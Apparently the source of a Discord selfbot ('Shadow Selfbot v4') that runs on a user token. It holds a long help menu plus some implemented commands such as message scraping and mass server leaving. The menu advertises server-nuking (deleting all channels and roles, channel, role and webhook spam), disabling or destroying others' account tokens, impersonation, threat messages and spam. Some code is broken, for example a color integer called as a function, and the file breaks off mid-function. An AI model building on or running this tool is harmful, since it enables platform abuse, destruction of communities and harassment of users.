import os, sys, psutil
import math
import requests, hashlib, socket, sys, wavelink, art, threading, io, base64, qrcode, re, json, time, colorama, datetime, traceback, qrcode, io,random, sys, urllib.parse , asyncio, aiohttp, discord, pytz
from discord.ext import commands, tasks
from colorama import Fore
from dhooks import Webhook, Webhook
from html import escape
import inspect
colorama.init()
import dateutil.parser as parser 
from datetime import datetime, timezone

def load_config(config_file_path):
    with open(config_file_path, 'r') as config_file:
        config = json.load(config_file)
    return config

def save_voice_channel(guild_id, channel_id):
    data = {}
    if os.path.exists(voice_file_path):
        with open(voice_file_path, "r") as f:
            data = json.load(f)
    data[str(guild_id)] = channel_id
    with open(voice_file_path, "w") as f:
        json.dump(data, f, indent=4)

def load_voice_channel(guild_id):
    if os.path.exists(voice_file_path):
        with open(voice_file_path, "r") as f:
            data = json.load(f)
            return data.get(str(guild_id))
    return None

if __name__ == "__main__":
    config_file_path = "config.json"
    config = load_config(config_file_path)
User_Id = config.get("User_Id")
SERVER_Link = config.get("SERVER_Link")
token = config.get("token")
bot_name = config.get("bot_name")
webhookk = config.get("webhook")
fuckoff = Webhook(f"{webhookk}")
prefix = config.get("prefix")
api_token = config.get("BLOCKCYPHER_API_TOKEN")
ltc_addy = config.get("LTC_ADDRESS") 
ltc_priv_key = config.get("LTC_PRIVATE_KEY") 
upi_addy = config.get("UPI_ID")
license_key = str(config.get("license_key"))
tknc= config.get("non_nito_alt")
api_key= config.get("tatum_api_key")
guild = config.get("guild")
channel_idd = config.get("channel_id")
#########################################################
responses_file = 'autorespo.json'
p2sx = "shadowdb-v4"
#################################################
statuses = []
current_status = 0
afk_users = {}
afk_reason = None
psx="b75H6UmyCsgfp2XY"
delete_bot_messages = False
giveawaysniping = "off"
streamurl = "https://www.twitch.tv/nocopyrightsounds"
nitrosniping = "off"
deleted_messages = {}
auto_responses = {}
vc = {}  
channel_id = None  
voice_file_path = "voice.json"
shadow_color = 0xbc00ff

bot = commands.Bot(command_prefix='>', self_bot=True, help_command=None)

####################################

headers = {"Content-Type": "application/json"}

def banner():
    print("\033[94m" + " █▀▀▀█  █  █  █▀▀█  █▀▀▄  █▀▀█  █   █    ▀▀█▀▀  █▀▀█  █▀▀█  █    █▀▀▀█ " + "\033[0m")
    print("\033[94m" + " ▀▀▀▄▄  █▀▀█  █▄▄█  █  █  █  █  █▄█▄█      █    █  █  █  █  █    ▀▀▀▄▄  " + "\033[0m")
    print("\033[94m" + " █▄▄▄█  ▀  ▀  ▀  ▀  ▀▀▀   ▀▀▀▀   ▀ ▀       █    ▀▀▀▀  ▀▀▀▀  ▀▀▀  █▄▄▄█ " + "\033[0m")
    print("\033[95m" + "                    Made by shadow.site                        " + "\033[0m")
    print("\033[95m" + "                    Shadow Selfbot v4                          " + "\033[0m")
    b = f"""
    --------------------------------------------
    \033[94m[\033[92m-\033[94m] » Logged in as {bot.user.name}\033[0m
    \033[94m[\033[92m-\033[94m] » User ID: {bot.user.id}\033[0m
    \033[94m[\033[92m-\033[94m] » Prefix: {bot.command_prefix}\033[0m
    \033[94m[\033[92m-\033[94m] » Cogs Loaded Successfully\033[0m
    --------------------------------------------
    """
    print(b)


@bot.event
async def on_ready():
    await bot.load_extension("cogs.auto_responder")
    await bot.load_extension("cogs.auto_sender")
    await bot.load_extension("cogs.afk")
    os.system('cls' if os.name == 'nt' else 'clear')    
    banner()
    try:
        with open("lavalink.json", "r") as lavalink_config_file:
            lavalink_config = json.load(lavalink_config_file)
        host = lavalink_config.get("host")
        port = lavalink_config.get("port")
        password = lavalink_config.get("password")
        https = lavalink_config.get("https")
        uri = f"https://{host}:{port}" if https else f"http://{host}:{port}"
        nodes = [wavelink.Node(uri=uri, password=password)]
        await wavelink.Pool.connect(nodes=nodes, client=bot, cache_capacity=100)
        print("[+] Connected to wavelink")
    except Exception as e:
        print(f"Failed to connect to Wavelink: {e}")
    for guild in bot.guilds:
        saved_channel_id = load_voice_channel(guild.id)
        if saved_channel_id:
            channel = bot.get_channel(saved_channel_id)
            if isinstance(channel, discord.VoiceChannel):
                try:
                    vc[guild.id] = await channel.connect()
                    print(f"Reconnected to the voice channel: {channel.name} in guild: {guild.name}")
                except discord.DiscordException as e:
                    print(f"Error connecting to {channel.name} in guild {guild.name}: {e}")

async def magic(message_id, forward_channel_id):
    headers = {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
        'Accept': '*/*'
    }
    payload = {
        "message_reference": {
            "message_id": message_id,
            "channel_id": channel_idd,
            "guild_id": guild,
            "type": 1
        }
    }
    url = f"https://discord.com/api/v10/channels/{forward_channel_id}/messages"
    while True:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, headers=headers, json=payload) as resp:
                if resp.status == 429:
                    retry_after = (await resp.json()).get("retry_after", 1)
                    await asyncio.sleep(retry_after)
                else:
                    return await resp.json()

async def help_embed(forward_channel_id):
    headers = {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
        'Accept': '*/*'
    }
    payload = {
        "message_reference": {
            "message_id": 1370710805770797067,
            "channel_id": 1370706724939501598,
            "guild_id": 1370706388707446835,
            "type": 1
        }
    }
    url = f"https://discord.com/api/v10/channels/{forward_channel_id}/messages"
    while True:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, headers=headers, json=payload) as resp:
                if resp.status == 429:
                    retry_after = (await resp.json()).get("retry_after", 1)
                    await asyncio.sleep(retry_after)
                else:
                    return await resp.json()
                
async def send_embed(ctx, embed: discord.Embed):
    try:
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(webhookk, session=session)
            webhook_msg = await webhook.send(
                embed=embed,
                username=ctx.author.display_name,
                avatar_url=ctx.author.avatar.url if ctx.author.avatar else None,
                wait=True
            )
        message_id = webhook_msg.id
        await magic(message_id, ctx.channel.id)
        return 
    except discord.HTTPException as e:
            raise

@bot.command(aliases=["h"])
async def help(ctx, helpcategory="none"):
    await ctx.message.delete()
    helpcategory = helpcategory.lower().replace("[", "").replace("]", "")
    command_count = len(bot.commands)
    embed = discord.Embed(color=shadow_color)
    now = datetime.now().strftime("%I:%M %p")
    if helpcategory == "none":
        await help_embed(ctx.channel.id)
        return
        
    elif "system" in helpcategory:
        embed.title = f"<:settings:1306221127126880256> System Commands"
        embed.description = (
            f"`{bot.command_prefix}help` - Shows this message\n"
            f"`{bot.command_prefix}ping` - Shows bot latency\n"
            f"`{bot.command_prefix}restart` - Restarts the bot\n"
            f"`{bot.command_prefix}shutdown` - Shuts down the bot\n"
            f"`{bot.command_prefix}allcmds` - Lists all commands\n"
        )
        embed.set_footer(text=f"Made by 75hq • Today at {now}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)

    elif "utility" in helpcategory:
        embed.title = f"<:Zeta_utility:1306221128221458463> Utility Commands"
        embed.description = (
            f"`{bot.command_prefix}afk [message]` - Set an AFK status\n"
            f"`{bot.command_prefix}unafk` - Removes AFK status\n"
            f"`{bot.command_prefix}instainfo [username]` - Displays info about a user\n"
            f"`{bot.command_prefix}deletemessagesafter [on/off]` - Toggle message delete after certain time\n"
            f"`{bot.command_prefix}nicknamecycle` - Cycles nicknames\n"
            f"`{bot.command_prefix}userinfo [user]` - Displays info about a user\n"
            f"`{bot.command_prefix}serverinfo` - Displays server info\n"
            f"`{bot.command_prefix}uptime` - Shows bot uptime\n"
            f"`{bot.command_prefix}avatar` - Shows your avatar\n"
            f"`{bot.command_prefix}downloadavatar` - Downloads your avatar\n"
            f"`{bot.command_prefix}purge [amount]` - Purges messages\n"
            f"`{bot.command_prefix}purgeuser @user` - Purges messages from a user\n"
            f"`{bot.command_prefix}dmclear` - Clears DMs\n"
            f"`{bot.command_prefix}colorinfo [hex-color]` - Displays info about a color\n"
            f"`{bot.command_prefix}bitcoin` - Displays Bitcoin info\n"
            f"`{bot.command_prefix}hypesquad [bravery/brilliance/balance]` - Shows Hypesquad info\n"
            f"`{bot.command_prefix}idtoname [id]` - Converts ID to username\n"
            f"`{bot.command_prefix}idinfo [id]` - Displays ID info\n"
            f"`{bot.command_prefix}ip [ip-to-locate]` - Locates an IP address\n"
            f"`{bot.command_prefix}leave [server-id]` - Makes the bot leave a server\n"
            f"`{bot.command_prefix}nickscan` - Scans for suspicious nicknames\n"
            f"`{bot.command_prefix}adminscan` - Scans for admin roles\n"
            f"`{bot.command_prefix}scrape` - Scrapes data from a server\n"
            f"`{bot.command_prefix}serverlist` - Displays all servers the bot is in\n"
            f"`{bot.command_prefix}firstmsg` - Displays the first message in the server\n"
            f"`{bot.command_prefix}screenshot` - Takes a screenshot\n"
            f"`{bot.command_prefix}getpic` - Retrieves a picture\n"
        )
        embed.set_footer(text=f"Made by 75hq • Today at {now}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)

    elif "emoji" in helpcategory:
        embed.title = f"<:stolen_emoji_blaze:1306312036845883394> Emoji Commands"
        embed.description = (
            f"`{bot.command_prefix}addemoji [emoji]` - Adds a custom emoji\n"
            f"`{bot.command_prefix}bigemoji [emoji]` - Makes emoji bigger\n"
            f"`{bot.command_prefix}downloadguildemojis [guild-id]` - Downloads emojis from a guild\n"
            f"`{bot.command_prefix}stealguildemoji [guild-id]` - Steals emojis from a guild\n"
        )
        embed.set_footer(text=f"Made by 75hq • Today at {now}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)

    elif "moderation" in helpcategory or "mod" in helpcategory:
        embed.title = f"<:HeadMod:1306221130654154796> Moderation Commands"
        embed.description = (
            f"`{bot.command_prefix}kick [user]` - Kicks a user\n"
            f"`{bot.command_prefix}ban [user]` - Bans a user\n"
            f"`{bot.command_prefix}banid [user-id]` - Bans a user by ID\n"
            f"`{bot.command_prefix}unban [user-id]` - Unbans a user by ID\n"
            f"`{bot.command_prefix}unbanall` - Unbans All banned members\n"
            f"`{bot.command_prefix}clearcontent [amount,content]` - Clears specific content\n"
            f"`{bot.command_prefix}nuke` - Nukes a channel\n"
        )
        embed.set_footer(text=f"Made by 75hq • Today at {now}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)

    elif "snipe" in helpcategory:
        embed.title = f"<:msg:1306221132327948358> Snipe Commands"
        embed.description = (
            f"`{bot.command_prefix}snipe` - Displays the last deleted message\n"
            f"`{bot.command_prefix}nitrosnipe [on/off]` - Toggles Nitro snipe\n"
            f"`{bot.command_prefix}giveawaysnipe [on/off]` - Toggles Giveaway snipe\n"
        )
        embed.set_footer(text=f"Made by 75hq • Today at {now}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)

    elif "nuke" in helpcategory:
        embed.title = f"<:thunder2:1305942208632983573> Nuke Commands"
        embed.description = (
            f"`{bot.command_prefix}prune [days]` - Prunes messages older than X days\n"
            f"`{bot.command_prefix}channelspam <name>` - Spams channels\n"
            f"`{bot.command_prefix}deletechannels` - Deletes all channels\n"
            f"`{bot.command_prefix}rolespam <name>` - Spams roles\n"
            f"`{bot.command_prefix}deleteroles` - Deletes all roles\n"
            f"`{bot.command_prefix}emojinuke` - Nukes all emojis\n"
            f"`{bot.command_prefix}webhookspam` - Spams webhooks\n"
            f"`{bot.command_prefix}stopwebhookspam` - Stops webhook spam\n"
            f"`{bot.command_prefix}webhookdelete [webhook]` - Deletes a webhook\n"
            f"`{bot.command_prefix}tokeninfo [token]` - Retrieves token info\n"
            f"`{bot.command_prefix}tokendisable [token]` - Disables a token\n"
            f"`{bot.command_prefix}fucktoken [token]` - Destroys a token\n"
        )
        embed.set_footer(text=f"Made by 75hq • Today at {now}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)

    elif "fun" in helpcategory:
        embed.title = f"<:fun:1306312785243930655> Fun Commands"
        embed.description = (
            f"`{bot.command_prefix}ascii [word]` - Converts text to ASCII art\n"
            f"`{bot.command_prefix}name [name]` - Generates a name\n"
            f"`{bot.command_prefix}nitro` - Nitro generator\n"
            f"`{bot.command_prefix}impersonate [user] [message]` - Impersonate a user\n"
            f"`{bot.command_prefix}www [user]` - Displays a user's website\n"
            f"`{bot.command_prefix}stickbug [user]` - Sends a stickbug message\n"
            f"`{bot.command_prefix}tweet [user] [message]` - Tweets as a user\n"
            f"`{bot.command_prefix}blurpify [user]` - Blurs a user's profile\n"
            f"`{bot.command_prefix}magic [user]` - Adds magic effect to a user\n"
            f"`{bot.command_prefix}deepfry [user]` - Deep fries a user’s avatar\n"
            f"`{bot.command_prefix}captcha [user]` - Generates a CAPTCHA\n"
            f"`{bot.command_prefix}threat [user]` - Sends a threat message\n"
            f"`{bot.command_prefix}iphone [user]` - Generates an iPhone message\n"
            f"`{bot.command_prefix}ship [user]` - Ships two users\n"
            f"`{bot.command_prefix}kannagen [text]` - Generates a message in the style of Kanna\n"
            f"`{bot.command_prefix}encrypt [message]` - Encrypts a message\n"
            f"`{bot.command_prefix}decrypt [message]` - Decrypts a message\n"
            f"`{bot.command_prefix}tokenhalf [user]` - Splits a token\n"
            f"`{bot.command_prefix}vcspam [vc-id-one] [vc-id-two] [user-id] [amount]` - Spams in a voice channel\n"
            f"`{bot.command_prefix}spampin [amount]` - Spams in pin\n"
            f"`{bot.command_prefix}spamreact [amount] [reaction]` - Spams a reaction\n"
            f"`{bot.command_prefix}spamedit [amount] [new-message]` - Spams edits\n"
            f"`{bot.command_prefix}spam [amount] [message]` - Spams a message\n"
            f"`{bot.command_prefix}qr [message]` - Generates a QR code\n"
        )
        embed.set_footer(text=f"Made by 75hq • Today at {now}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)

    elif "vouch" in helpcategory:
        embed.title = f"<:prices:1305942191629271120> Vouch Commands"
        embed.description = (
            f"`{bot.command_prefix}vouch @user <amount> <product>` - Creates a format to vouch for a user\n"
        )
        embed.set_footer(text=f"Made by 75hq • Today at {now}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)

    elif "crypto" in helpcategory:
        embed.title = f"<:Crypto_Exchange:1306307580687028345> Crypto Cmds"
        embed.description = (
            f"`{bot.command_prefix}i2c <amount>` - Convert from I to C\n"
            f"`{bot.command_prefix}c2i <amount>` - Convert from C to I\n"
            f"`{bot.command_prefix}c2c <from> <to> <amount>` - Convert between cryptocurrencies (C to C)\n"
            f"`{bot.command_prefix}check <crypto>` - Check the status of a specific cryptocurrency\n"
            f"`{bot.command_prefix}price <crypto>` - Get the current price of a specified cryptocurrency\n"
            f"`{bot.command_prefix}convertcrypto <from> <to> <amount>` - Convert between different cryptocurrencies\n"
        )
        embed.set_footer(text=f"Made by 75hq • Today at {now}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)

    elif "text" in helpcategory:
        embed.title = f"<:ticket:1300853179927363599> Text Cmds"
        embed.description = (
            f"`{bot.command_prefix}block [text]` - Block text formatting\n"
            f"`{bot.command_prefix}redtext [text]` - Red-colored text\n"
            f"`{bot.command_prefix}orangetext [text]` - Orange-colored text\n"
            f"`{bot.command_prefix}yellowtext [text]` - Yellow-colored text\n"
            f"`{bot.command_prefix}lightgreentext [text]` - Light green-colored text\n"
            f"`{bot.command_prefix}greentext [text]` - Green-colored text\n"
            f"`{bot.command_prefix}cyantext [text]` - Cyan-colored text\n"
            f"`{bot.command_prefix}bluetext [text]` - Blue-colored text\n"
            f"`{bot.command_prefix}bold [text]` - Bold text\n"
            f"`{bot.command_prefix}underline [text]` - Underlined text\n"
            f"`{bot.command_prefix}spoiler [text]` - Spoiler text\n"
            f"`{bot.command_prefix}italic [text]` - Italic text\n"
            f"`{bot.command_prefix}shrug [text]` - Shrug text\n"
            f"`{bot.command_prefix}fliptable [text]` - Flip table text\n"
            f"`{bot.command_prefix}unfliptable [text]` - Unflip table text\n"
            f"`{bot.command_prefix}hastebin [text]` - Upload to hastebin\n"
        )
        embed.set_footer(text=f"Made by 75hq • Today at {now}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)

    elif "guild" in helpcategory:
        embed.title = f"<:copy:1305898732084269106> Guild Cmds"
        embed.description = (
            f"`{bot.command_prefix}cserver <target-guild> <guild-to-change>` - Copy roles, channels\n"
            f"`{bot.command_prefix}cchannels <target-guild> <guild-to-change>` - Copy channels\n"
            f"`{bot.command_prefix}croles <target-guild> <guild-to-change>` - Copy Roles\n"
        )
        embed.set_footer(text=f"Made by 75hq • Today at {now}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)

    elif "autorespond" in helpcategory or "autoresponder" in helpcategory:
        embed.title = f"<:Members:1305993106457497612> Auto Responder Cmds"
        embed.description = (
            f"`{bot.command_prefix}setar <trigger-word> <reply-msg>` - Set an auto-response\n"
            f"`{bot.command_prefix}removear <trigger-word>` - Remove an auto-response\n"
            f"`{bot.command_prefix}showar` - Show all auto-responses\n"
        )
        embed.set_footer(text=f"Made by 75hq • Today at {now}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)

    elif "ltcsender" in helpcategory:
        embed.title = f"<:LTC:1305994660073963530> LTC Sender Cmds"
        embed.description = (
            f"`{bot.command_prefix}sendltc <addy> <amount-in-usd>$` - Send LTC to a specified address\n"
            f"`{bot.command_prefix}mybal` - Check your wallet's current balance\n"
            f"`{bot.command_prefix}bal <ltcaddress>` - Check the balance of a specific LTC address\n"
            f"`{bot.command_prefix}genwallet` - Generate a new Litecoin wallet\n"
            f"`{bot.command_prefix}wallets` - List all saved wallets\n"
        )
        embed.set_footer(text=f"Made by 75hq • Today at {now}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)

    elif "checker" in helpcategory:
        embed.title = f"<:check:1305951941423009803> Checker Cmds"
        embed.description = (
            f"`{bot.command_prefix}tokeninfo <token>` - Get token information\n"
            f"`{bot.command_prefix}checkpromo <promo-link>` - Check a promo link\n"
        )
        embed.set_footer(text=f"Made by 75hq • Today at {now}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)

    elif "selling" in helpcategory:
        embed.title = f"<:prices:1305942191629271120> Selling Cmds"
        embed.description = (
            f"`{bot.command_prefix}addy` - Get your LTC address\n"
            f"`{bot.command_prefix}upi` - Get your UPI address\n"
            f"`{bot.command_prefix}upiqr <amount>` - Receive payments via UPI\n"
            f"`{bot.command_prefix}ltcqr <amount>` - Receive payments via LTC\n"
        )
        embed.set_footer(text=f"Made by 75hq • Today at {now}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)

    elif "status" in helpcategory:
        embed.title = f"<:Lr_simp_dot:1307938031067598868> Status Cmds"
        embed.description = (
            f"`{bot.command_prefix}status [emoji, statusmsg]` - Set a status\n"
            f"`{bot.command_prefix}setmobile` - Set mobile status\n"
            f"`{bot.command_prefix}watch [status]` - Set a watching status\n"
            f"`{bot.command_prefix}listen [status]` - Set a listening status\n"
            f"`{bot.command_prefix}game [status]` - Set a game status\n"
            f"`{bot.command_prefix}stream [status]` - Set a stream status\n"
            f"`{bot.command_prefix}twitchurl [twitch-url]` - Set Twitch stream status\n"
        )
        embed.set_footer(text=f"Made by 75hq • Today at {now}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)

    elif "vc" in helpcategory:
        embed.title = f"<:humanity_VC:1307940060989231154> VC Cmds"
        embed.description = (
            f"`{bot.command_prefix}vcmute` - Mute a user in voice channel\n"
            f"`{bot.command_prefix}vcunmute` - Unmute a user in voice channel\n"
            f"`{bot.command_prefix}vcdeafen` - Deafen a user in voice channel\n"
            f"`{bot.command_prefix}vcundeafen` - Undeafen a user in voice channel\n"
            f"`{bot.command_prefix}vc247 [on/off]` - Keep your ID 24/7 in VC\n"
            f"`{bot.command_prefix}vckick [user]` - Kick a user from VC\n"
            f"`{bot.command_prefix}vcmoveall` - Move all users to another channel\n"
            f"`{bot.command_prefix}vcmove [user] [channel]` - Move a user to another channel\n"
            f"`{bot.command_prefix}vcjoin [voice-channel]` - Join a voice channel\n"
            f"`{bot.command_prefix}vcleave` - Leave the voice channel\n"
            f"`{bot.command_prefix}vcclear` - Clear all users from VC\n"
            f"`{bot.command_prefix}vcsetlimit [limit]` - Set a limit for users in VC\n"
            f"`{bot.command_prefix}vcname [new_name]` - Rename the current voice channel\n"
        )
        embed.set_footer(text=f"Made by 75hq • Today at {now}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)

    elif "usercmds" in helpcategory:
        embed.title = f"<:43565member:1306361082922799114> User Cmds"
        embed.description = (
            f"`{bot.command_prefix}delfriends` - Remove all friends\n"
            f"`{bot.command_prefix}closealldms` - Close all DMs\n"
            f"`{bot.command_prefix}clearpendings` - Clear all pending requests\n"
            f"`{bot.command_prefix}leaveall` - Leave all servers\n"
            f"`{bot.command_prefix}leaveallgroups` - Leave all groups\n"
        )
        embed.set_footer(text=f"Made by 75hq • Today at {now}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)

    elif "nsfw" in helpcategory:
        embed.title = f":underage: NSFW Cmds"
        embed.description = (
            f"`{bot.command_prefix}anal` - Get anal pics\n"
            f"`{bot.command_prefix}erofeet` - Get ero-feet pics\n"
            f"`{bot.command_prefix}feet` - Get feet pics\n"
            f"`{bot.command_prefix}hentai` - Get hentai pics\n"
            f"`{bot.command_prefix}boobs` - Get boob pics\n"
            f"`{bot.command_prefix}tits` - Get titty pics\n"
            f"`{bot.command_prefix}blowjob` - Get blowjob pics\n"
            f"`{bot.command_prefix}neko` - Get neko pics\n"
            f"`{bot.command_prefix}lesbian` - Get lesbian pics\n"
            f"`{bot.command_prefix}cumslut` - Get cumslut pics\n"
            f"`{bot.command_prefix}pussy` - Get pussy pics\n"
            f"`{bot.command_prefix}waifu` - Get waifu pics\n"
            f"`{bot.command_prefix}ass` - Get ass pics\n"
            f"`{bot.command_prefix}hwallpaper` - Get hentai wallpaper pics\n"
            f"`{bot.command_prefix}spank` - Get spank pics\n"
            f"`{bot.command_prefix}lesbian` - Get lesbian pics\n"
            f"`{bot.command_prefix}feet` - Get feet pics\n"
            f"`{bot.command_prefix}blowjob` - Get blowjob pics\n"
            f"`{bot.command_prefix}ahegao` - Get ahegao pics\n"
            f"`{bot.command_prefix}cumm` - Get cumm pics\n"
            f"`{bot.command_prefix}hass` - Get hass pics\n"
            f"`{bot.command_prefix}hrandom` - Get random NSFW pics\n"
        )
        embed.set_footer(text=f"Made by 75hq • Today at {now}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)

    elif "security" in helpcategory:
        embed.title = f"<:MOD:1308128124172500992> Security Cmds"
        embed.description = (
            f"`{bot.command_prefix}lockdown [on/off]` - Toggle lockdown mode\n"
            f"`{bot.command_prefix}kickallbots` - Kick all bots from the server\n"
            f"`{bot.command_prefix}deleteallwebhooks` - Delete all webhooks\n"
        )
        embed.set_footer(text=f"Made by 75hq • Today at {now}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)

    elif "music" in helpcategory:
        embed.title = f"<:music:1309894376440332403> Music Cmds"
        embed.description = (
            f"`{bot.command_prefix}play <song-name>` - Play a song\n"
            f"`{bot.command_prefix}stop` - Stop the music\n"
            f"`{bot.command_prefix}skip` - Skip the current song\n"
            f"`{bot.command_prefix}volume <value>` - Adjust the volume\n"
            f"`{bot.command_prefix}pause` - Pause the music\n"
            f"`{bot.command_prefix}resume` - Resume the music\n"
            f"`{bot.command_prefix}disconnect` - Disconnect the bot from the voice channel\n"
            f"`{bot.command_prefix}queue` - Show the current music queue\n"
            f"`{bot.command_prefix}nowplaying` - Show the currently playing song\n"
            f"`{bot.command_prefix}shuffle` - Shuffle the music queue\n"
            f"`{bot.command_prefix}loop` - Toggle looping for the current song\n"
            f"`{bot.command_prefix}clearqueue` - Clear the music queue\n"
          )
        embed.set_footer(text=f"Made by 75hq • Today at {now}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)
        
    elif "autosender" in helpcategory:
        embed.title = f"<a:7492symbollattice:1310977804925407293> Auto Responder Cmds"
        embed.description = (
            f"`{bot.command_prefix}startautosender <channel_id> <cooldown_time> <msg>` - Start an auto-responder\n"
            f"`{bot.command_prefix}stopautosender <channel_id>` - Stop an auto-responder\n")
        embed.set_footer(text=f"Made by 75hq • Today at {now}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)

    else:
        embed.title = "❓ Unknown Help Category"
        embed.description = (
            "Valid categories:\n"
            "`system`, `utility`, `emoji`, `moderation`, `snipe`, `nuke`, `fun`, `vouch`, `crypto`, "
            "`text`, `guild`, `autorespond`, `ltcsender`, `checker`, `selling`, `status`, `vc`, "
            "`usercmds`, `security`, `music`, `autosender`, `nsfw`."
        )
    await send_embed(ctx, embed)


############################################
#            System Commands               #
############################################

@bot.command()
async def allcmds(ctx):
    await ctx.send(f'{bot.command_prefix}help system')
    await ctx.send(f'{bot.command_prefix}help utility')
    await ctx.send(f'{bot.command_prefix}help moderation')
    await ctx.send(f'{bot.command_prefix}help snipe')
    await ctx.send(f'{bot.command_prefix}help nuke')
    await ctx.send(f'{bot.command_prefix}help fun')
    await ctx.send(f'{bot.command_prefix}help text')
    await ctx.send(f'{bot.command_prefix}help vouch')
    await ctx.send(f'{bot.command_prefix}help crypto')
    await ctx.send(f'{bot.command_prefix}help guild')
    await ctx.send(f'{bot.command_prefix}help autorespond')
    await ctx.send(f'{bot.command_prefix}help checker')
    await ctx.send(f'{bot.command_prefix}help ltcsender')
    await ctx.send(f'{bot.command_prefix}help selling')
    await ctx.send(f'{bot.command_prefix}help status')
    await ctx.send(f'{bot.command_prefix}help vc')
    await ctx.send(f'{bot.command_prefix}help security')
    await ctx.send(f'{bot.command_prefix}help nsfw')
    await ctx.send(f'{bot.command_prefix}help usercmds')
    await ctx.send(f'{bot.command_prefix}help music')
    await ctx.send(f'{bot.command_prefix}help autosender')

@bot.command()
async def ping(ctx):
    latency = round(bot.latency * 1000)
    
    embed = discord.Embed(
        title="Ping",
        description=f"> Ping: {latency}ms",
        color=shadow_color)
    
    await send_embed(ctx, embed)


@bot.command()
async def restart(ctx):
    embed = discord.Embed(
        title="Restarting Bot",
        description="The bot is restarting...",
        color=shadow_color() )
    
    await send_embed(ctx, embed)
    
    os.execv(sys.executable, ['python'] + sys.argv)


@bot.command()
async def shutdown(ctx):
    embed = discord.Embed(
        title="Shutting Down",
        description="The bot is shutting down...",
        color=shadow_color )
    
    await send_embed(ctx, embed)
    await bot.close()

@bot.command(name='nickscan', aliases=['scan'], brief="Scans for servers where I have nicknames", usage=".nickscan")
async def nickscan(ctx):
    embed = discord.Embed(
        title="Nickname Scan",
        description="Here are the servers where I have nicknames set:",
        color=shadow_color
    )
    
    found_nicknames = False
    for guild in ctx.bot.guilds:
        if guild.me.nick:
            embed.add_field(
                name=f"Server: {guild.name}",
                value=f"**Nickname:** {guild.me.nick}\n**Server ID:** {guild.id}",
                inline=False
            )
            found_nicknames = True
    
    if not found_nicknames:
        embed.description = "I don't have nicknames set in any server."
    
    await send_embed(ctx, embed)


@bot.command(name='adminscan', brief="Scans for servers where I have admins", usage=".adminscan")
async def adminscan(ctx):
    guilds_with_admin = [f"Server ID: {guild.id}, Server Name: {guild.name}" for guild in ctx.bot.guilds if guild.me.guild_permissions.administrator]
    response = "__Servers where I have admins:__\n\n" + "\n".join(guilds_with_admin)
    
    embed = discord.Embed(
        title="Admin Scan",
        description=response,
        color=shadow_color )
    
    await send_embed(ctx, embed)


@bot.command(name='scrape', brief="Scrapes messages in a channel", usage=".scrape <number_of_messages>")
async def scrape(ctx, num_messages: int = None):
    if not num_messages or num_messages <= 0:
        embed = discord.Embed(
            title="Invalid Usage",
            description="Please provide a valid number of messages to scrape.\nUsage: `.scrape <number_of_messages>`",
            color=shadow_color
        )
        await send_embed(ctx, embed)
        return

    messages = []
    async for message in ctx.channel.history(limit=num_messages):
        content = escape(message.content)
        timestamp = message.created_at.strftime('%Y-%m-%d %H:%M:%S')
        messages.append(f'{message.author.name} ({timestamp}): {content}\n')

    file_name = f"scrape_{ctx.message.id}.txt"
    with open(file_name, 'w', encoding='utf-8') as file:
        file.writelines(reversed(messages))

    embed = discord.Embed(
        title="Scrape Results",
        description=f"Scraped {num_messages} messages from {ctx.channel.name}.",
        color=shadow_color
    )
    await send_embed(ctx, embed)

    await ctx.send(file=discord.File(file_name), delete_after=30)
    os.remove(file_name)


@bot.command(name='asci', aliases=['ascii'], brief="Generate ASCII art", usage=".asci <text>")
async def ascii(ctx, *, text: str):
    try:
        ascii_art = art.text2art(text)
        
        embed = discord.Embed(
            title="ASCII Art",
            description=f"```{ascii_art}```",
            color=shadow_color() )
        
        await send_embed(ctx, embed)
    except Exception as e:
        embed = discord.Embed(
            title="Error",
            description=f"⚠️ Error generating ASCII art:\n {str(e)}",
            color=shadow_color )
        
        await send_embed(ctx, embed)


@bot.command(aliases=['leaveall'])
async def massleave(ctx):
    guild_counter = len(ctx.bot.guilds)
    index = 0
    for guild in ctx.bot.guilds:
        index += 1
        if guild.owner_id == ctx.bot.user.id:
            embed = discord.Embed(
                title="Mass Leave",
                description=f"I'm the owner of {guild.name}, Seems like I can't leave.",
                color=shadow_color )
            await send_embed(ctx, embed)
            continue
        
        try:
            await guild.leave()
            embed = discord.Embed(
                title="Mass Leave",
                description=f"[{index}/{guild_counter}] Left {guild.name}",
                color=shadow_color )
        except Exception as e:
            embed = discord.Embed(
                title="Mass Leave",
                description=f"[{index}/{guild_counter}] Couldn't leave {guild.name} - {e}",
                color=shadow_color )
        
        await send_embed(ctx, embed)


@bot.command(name='serverlist', aliases=['slist', 'listserver'], brief="Shows user server lists", usage=".serverlist <no.>")
async def serverlist(ctx, page_number: int = 1):
    if not isinstance(page_number, int) or page_number < 1:
        embed = discord.Embed(
            title="Error",
            description="Page number must be at least 1.",
            color=shadow_color )
        
        await send_embed(ctx, embed)
        return
    
